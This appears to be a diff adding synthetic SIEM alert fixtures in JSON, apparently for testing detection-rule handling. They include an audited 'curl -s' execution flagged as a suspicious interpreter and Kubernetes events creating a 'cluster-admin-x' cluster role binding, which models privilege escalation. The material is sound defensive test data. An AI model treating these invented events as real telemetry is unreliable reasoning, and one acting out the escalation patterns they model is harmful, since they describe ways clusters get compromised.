+  "agent": {
+   "name": "app-06"
+  },
+  "rule": {
+   "id": "200002",
+   "level": 12,
+   "description": "Suspicious interpreter started.",
+   "groups": []
+  },
+  "data": {
+   "audit": {
+    "execve": {
+     "a0": "curl",
+     "a1": "-s"
+    },
+    "exe": "/usr/bin/curl",
+    "auid": "1000"
+   }
+  }
+ },
+ {
+  "timestamp": "2026-11-15T06:00:00.000+0000",
+  "agent": {
+   "name": "app-06"
+  },
+  "rule": {
+   "id": "200012",
+   "level": 11,
+   "description": "Unlinked detection rule fired.",
+   "groups": []
+  },
+  "full_log": "Nov 15 06:00:00 app-06 thing: state changed 42"
+ },
+ {
+  "timestamp": "2026-11-15T06:05:00.000+0000",
+  "agent": {
+   "name": "app-06"
+  },
+  "rule": {
+   "id": "200013",
+   "level": 8,
+   "description": "Low level case rule.",
+   "groups": []
+  },
+  "data": {
+   "audit": {
+    "exe": "/usr/bin/true",
+    "auid": "1000"
+   }
+  }
+ },
+ {
+  "timestamp": "2026-11-15T06:06:00.000+0000",
+  "agent": {
+   "name": "app-06"
+  },
+  "rule": {
+   "id": "200011",
+   "level": 12,
+   "description": "Aggregated only.",
+   "groups": []
+  },
+  "data": {
+   "audit": {
+    "exe": "/usr/bin/true",
+    "auid": "1000"
+   }
+  }
+ },
+ {
+  "timestamp": "2026-11-15T08:00:00.000+0000",
+  "agent": {
+   "name": "k8s-cp-01"
+  },
+  "rule": {
+   "id": "200010",
+   "level": 10,
+   "description": "Cluster role binding created.",
+   "groups": []
+  },
+  "data": {
+   "user": {
+    "username": "system:serviceaccount:kube-system:deployer"
+   },
+   "objectRef": {
+    "resource": "clusterrolebindings",
+    "name": "cluster-admin-x"
+   },
+   "verb": "create",
+   "sourceIPs": [
+    "10.7.2.2"
+   ]
+  }
+ },
+ {
+  "timestamp": "2026-11-15T08:01:00.000+0000",
+  "agent": {
+   "name": "k8s-cp-01"
+  },
+  "rule": {
+   "id": "200010",
+   "level": 10,
+   "description": "Cluster role binding created.",
+   "groups": []
+  },
+  "data": {
+   "user": {
+    "username": "admin@corp.example"
+   },
+   "objectRef": {
+    "resource": "rolebindings",
+    "namespace": "prod",
+    "name": "edit-x"
+   },
+   "verb": "create",
+   "sourceIPs": [
+    "10.7.2.3"
+   ]
+  }
+ },
+ {
+  "timestamp": "2026-11-15T08:02:00.000+0000",
+  "agent": {
+   "name": "k8s-cp-01"
+  },
+  "rule": {
+   "id": "200010",
+   "level": 10,
+   "description": "Cluster role binding created.",
+   "groups": []
+  },
+  "data": {
+   "user": {
+    "username": "kubernetes-admin"
+   },
+   "objectRef": {
+    "resource": "clusterroles"
+   },
+   "verb": "patch",
+   "sourceIPs": [
+    "10.7.2.4"
+   ]
+  }
+ }
+]
